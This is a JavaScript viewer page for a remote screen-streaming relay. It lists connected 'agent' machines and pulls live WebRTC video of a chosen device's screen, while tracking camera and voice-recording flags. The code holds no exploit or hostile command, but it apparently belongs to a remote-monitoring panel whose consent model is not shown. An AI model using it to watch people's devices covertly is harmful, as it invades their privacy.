import { io } from 'https://cdn.socket.io/4.7.5/socket.io.esm.min.js';

const els = {
  connectionStatus: document.getElementById('connection-status'),
  controlFeedback: document.getElementById('control-feedback'),
  agentSelect: document.getElementById('agent-select'),
  agentHelper: document.getElementById('agent-helper'),
  startStream: document.getElementById('start-stream'),
  stopStream: document.getElementById('stop-stream'),
  video: document.getElementById('stream-video'),
  frameTimestamp: document.getElementById('frame-timestamp'),
  metaResolution: document.getElementById('meta-resolution'),
  metaAgent: document.getElementById('meta-agent'),
  metaFrameAge: document.getElementById('meta-frame-age')
};

const STUN_SERVERS = ['stun:stun.l.google.com:19302'];

const state = {
  socket: null,
  agents: [],
  agentState: {},
  selectedAgentId: '',
  lastFrameAt: 0,
  peerConnection: null,
  sessionId: ''
};

const apiBaseUrl = `${window.location.protocol}//${window.location.host}`;

const createSessionId = () => (crypto?.randomUUID ? crypto.randomUUID() : `sess-${Date.now()}-${Math.round(Math.random() * 1e6)}`);

const setStatus = (message, type = '') => {
  els.connectionStatus.textContent = message;
  els.connectionStatus.classList.remove('ok', 'error');
  if (type) {
    els.connectionStatus.classList.add(type);
  }
};

const setControlFeedback = (message, type = '') => {
  els.controlFeedback.textContent = message || '';
  els.controlFeedback.classList.remove('ok', 'warn', 'error');
  if (type) {
    els.controlFeedback.classList.add(type);
  }
};

const formatAgentOption = (agent) => {
  const status = agent.screenStreaming ? 'LIVE' : 'IDLE';
  return `${agent.machine} (${agent.id.slice(0, 6)}) • ${status}`;
};

const updateAgentHelper = () => {
  if (!state.selectedAgentId) {
    els.agentHelper.textContent = 'Select a device to start streaming.';
    return;
  }
  const agent = state.agents.find((a) => a.id === state.selectedAgentId);
  if (!agent) {
    els.agentHelper.textContent = 'Selected device went offline. Choose another.';
    return;
  }
  const runtime = state.agentState[state.selectedAgentId];
  const streaming = runtime?.screenStreaming;
  els.agentHelper.textContent = `${agent.machine} is ${streaming ? 'currently streaming.' : 'ready.'}`;
};

const updateControlButtons = () => {
  const hasSocket = Boolean(state.socket && state.socket.connected);
  const hasSelection = Boolean(state.selectedAgentId);
  const streaming = Boolean(state.sessionId);

  els.startStream.disabled = !hasSocket || !hasSelection || streaming;
  els.stopStream.disabled = !hasSocket || !hasSelection || !streaming;
};

const updateAgentOptions = () => {
  const select = els.agentSelect;
  select.innerHTML = '';

  if (!state.agents.length) {
    const option = document.createElement('option');
    option.value = '';
    option.textContent = 'No devices online';
    select.appendChild(option);
    state.selectedAgentId = '';
    updateAgentHelper();
    updateControlButtons();
    return;
  }

  state.agents.forEach((agent) => {
    const option = document.createElement('option');
    option.value = agent.id;
    option.textContent = formatAgentOption(agent);
    if (agent.id === state.selectedAgentId) {
      option.selected = true;
    }
    select.appendChild(option);
  });

  if (!state.selectedAgentId || !state.agents.some((agent) => agent.id === state.selectedAgentId)) {
    state.selectedAgentId = state.agents[0].id;
    select.value = state.selectedAgentId;
  }

  updateAgentHelper();
  updateControlButtons();
};

const resetPreview = () => {
  if (els.video.srcObject) {
    const tracks = els.video.srcObject.getTracks();
    tracks.forEach((track) => track.stop());
    els.video.srcObject = null;
  }
  els.frameTimestamp.textContent = 'Waiting...';
  els.metaResolution.textContent = '—';
  els.metaAgent.textContent = '—';
  els.metaFrameAge.textContent = '—';
  state.lastFrameAt = 0;
};

const formatAgo = (timestamp) => {
  if (!timestamp) {
    return '—';
  }
  const diff = Math.max(0, Date.now() - timestamp);
  if (diff < 1000) {
    return 'Just now';
  }
  if (diff < 60 * 1000) {
    return `${Math.round(diff / 1000)}s ago`;
  }
  const minutes = Math.round(diff / 60000);
  return `${minutes}m ago`;
};

const updateFrameAge = () => {
  els.metaFrameAge.textContent = formatAgo(state.lastFrameAt);
};

const cleanupPeerConnection = (reason = '') => {
  if (state.peerConnection) {
    try {
      state.peerConnection.ontrack = null;
      state.peerConnection.onicecandidate = null;
      state.peerConnection.onconnectionstatechange = null;
      state.peerConnection.close();
    } catch (error) {
      console.warn('Peer cleanup error', error);
    }
  }
  state.peerConnection = null;
  state.sessionId = '';
  resetPreview();
  updateControlButtons();
  if (reason) {
    setControlFeedback(reason, 'warn');
  }
};

const attachRemoteStream = (event, agentId) => {
  if (event.streams && event.streams[0]) {
    els.video.srcObject = event.streams[0];
    state.lastFrameAt = Date.now();
    els.frameTimestamp.textContent = `Receiving: ${new Date(state.lastFrameAt).toLocaleTimeString()}`;
    const agent = state.agents.find((a) => a.id === agentId);
    if (agent) {
      els.metaAgent.textContent = `${agent.machine} (${agent.id.slice(0, 6)})`;
    }
    const track = event.track;
    if (track && track.kind === 'video') {
      track.onunmute = () => {
        const settings = track.getSettings ? track.getSettings() : {};
        if (settings.width && settings.height) {
          els.metaResolution.textContent = `${settings.width}×${settings.height}`;
        }
      };
    }
  }
};

const disconnectSocket = () => {
  if (state.socket) {
    if (typeof state.socket.removeAllListeners === 'function') {
      state.socket.removeAllListeners();
    }
    state.socket.disconnect();
    state.socket = null;
  }
  cleanupPeerConnection('Socket disconnected.');
  setStatus('Disconnected', 'error');
};

const connectSocket = () => {
  disconnectSocket();

  const socket = io(apiBaseUrl, {
    transports: ['websocket', 'polling'],
    autoConnect: false,
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    timeout: 20000
  });
  socket.auth = { clientType: 'viewer' };
  state.socket = socket;

  socket.on('connect', () => {
    setStatus(`Connected: ${socket.id}`, 'ok');
    setControlFeedback('Connected to live stream relay.', 'ok');
    updateControlButtons();
  });

  socket.on('connect_error', (error) => {
    setStatus(`Connection error: ${error.message}`, 'error');
    setControlFeedback(`Socket error: ${error.message}`, 'error');
    updateControlButtons();
  });

  socket.on('disconnect', (reason) => {
    setStatus(`Disconnected: ${reason}`, 'error');
    cleanupPeerConnection('Connection lost. Waiting to reconnect...');
    setControlFeedback('Connection lost. Waiting to reconnect...', 'warn');
    updateControlButtons();
  });

  socket.on('update_agent_list', (agents = []) => {
    state.agents = agents;
    agents.forEach((agent) => {
      state.agentState[agent.id] = {
        ...state.agentState[agent.id],
        screenStreaming: Boolean(agent.screenStreaming),
        machine: agent.machine
      };
    });
    updateAgentOptions();
  });

  socket.on('ui_agent_state', (data = {}) => {
    if (!data?.agentId) {
      return;
    }
    state.agentState[data.agentId] = {
      ...(state.agentState[data.agentId] || {}),
      recording: Boolean(data.recording),
      cameraOn: Boolean(data.cameraOn),
      voiceRecording: Boolean(data.voiceRecording),
      screenStreaming: Boolean(data.screenStreaming),
      machine: data.machine || state.agentState[data.agentId]?.machine
    };
    if (data.agentId === state.selectedAgentId) {
      updateAgentHelper();
    }
  });

  socket.on('webrtc_answer', async (data = {}) => {
    if (!data?.sessionId || data.sessionId !== state.sessionId) {
      return;
    }
    if (!state.peerConnection || !data.answer) {
      return;
    }
    try {
      await state.peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
      setControlFeedback('Stream connected. Waiting for frames...', 'ok');
    } catch (error) {
      console.error('Failed to set remote description', error);
      setControlFeedback('Failed to start stream.', 'error');
      cleanupPeerConnection('Unable to start stream.');
    }
  });

  socket.on('webrtc_ice_candidate', async (data = {}) => {
    if (!data?.sessionId || data.sessionId !== state.sessionId) {
      return;
    }
    if (!state.peerConnection) {
      return;
    }
    const candidate = data.candidate;
    try {
      if (!candidate) {
        await state.peerConnection.addIceCandidate(null);
        return;
      }
      await state.peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
    } catch (error) {
      console.warn('Failed to add ICE candidate', error);
    }
  });

  socket.on('webrtc_status', (data = {}) => {
    if (!data?.sessionId || data.sessionId !== state.sessionId) {
      return;
    }
    if (data.stage === 'session_closed') {
      cleanupPeerConnection('Stream closed by remote device.');
    } else if (data.stage === 'connection_state') {
      const stateLabel = data.connectionState || 'unknown';
      if (['failed', 'disconnected'].includes(stateLabel)) {
        setControlFeedback(`Connection ${stateLabel}.`, 'warn');
      }
    } else if (data.stage === 'error') {
      setControlFeedback(data.message || 'Stream failed.', 'error');
      cleanupPeerConnection('Stream failed.');
    }
  });

  socket.connect();
};

const startStream = async () => {
  if (!state.socket || !state.socket.connected) {
    setControlFeedback('Socket offline. Please wait...', 'warn');
    return;
  }
  if (!state.selectedAgentId) {
    setControlFeedback('Select a device first.', 'warn');
    return;
  }
  if (state.sessionId) {
    setControlFeedback('A stream is already running.', 'warn');
    return;
  }

  const sessionId = createSessionId();
  const pc = new RTCPeerConnection({ iceServers: STUN_SERVERS.map((url) => ({ urls: url })) });
  state.peerConnection = pc;
  state.sessionId = sessionId;
  updateControlButtons();

  pc.addTransceiver('video', { direction: 'recvonly' });

  pc.ontrack = (event) => attachRemoteStream(event, state.selectedAgentId);

  pc.onicecandidate = (event) => {
    state.socket?.emit('admin_webrtc_ice_candidate', {
      targetId: state.selectedAgentId,
      sessionId,
      candidate: event.candidate
        ? {
            candidate: event.candidate.candidate,
            sdpMid: event.candidate.sdpMid,
            sdpMLineIndex: event.candidate.sdpMLineIndex
          }
        : null
    });
  };

  pc.onconnectionstatechange = () => {
    const connectionState = pc.connectionState;
    if (connectionState === 'connected') {
      setControlFeedback('Connected.', 'ok');
    }
    if (['failed', 'disconnected', 'closed'].includes(connectionState)) {
      cleanupPeerConnection(`Connection ${connectionState}.`);
    }
  };

  try {
    const offer = await pc.createOffer({ offerToReceiveVideo: true });
    await pc.setLocalDescription(offer);
    state.socket.emit('admin_webrtc_offer', {
      targetId: state.selectedAgentId,
      sessionId,
      offer: pc.localDescription
    });
    setControlFeedback('Requesting live stream...', 'ok');
  } catch (error) {
    console.error('Failed to start stream', error);
    setControlFeedback('Failed to start stream.', 'error');
    cleanupPeerConnection('Unable to create offer.');
  }
};

const stopStream = () => {
  if (!state.socket || !state.socket.connected) {
    setControlFeedback('Socket offline. Please wait...', 'warn');
    return;
  }
  if (!state.sessionId) {
    setControlFeedback('No active stream.', 'warn');
    return;
  }
  state.socket.emit('admin_webrtc_stop', {
    targetId: state.selectedAgentId,
    sessionId: state.sessionId
  });
  cleanupPeerConnection('Stream stopped.');
};

const handleAgentChange = (event) => {
  state.selectedAgentId = event.target.value;
  if (state.sessionId) {
    stopStream();
  } else {
    resetPreview();
  }
  updateAgentHelper();
  updateControlButtons();
};

els.agentSelect.addEventListener('change', handleAgentChange);
els.startStream.addEventListener('click', () => {
  startStream();
});
els.stopStream.addEventListener('click', () => {
  stopStream();
});
els.video.addEventListener('timeupdate', () => {
  if (!els.video.paused && !els.video.ended) {
    state.lastFrameAt = Date.now();
    els.frameTimestamp.textContent = `Receiving: ${new Date(state.lastFrameAt).toLocaleTimeString()}`;
  }
});

setInterval(updateFrameAge, 1000);
setStatus('Connecting...');
connectSocket();
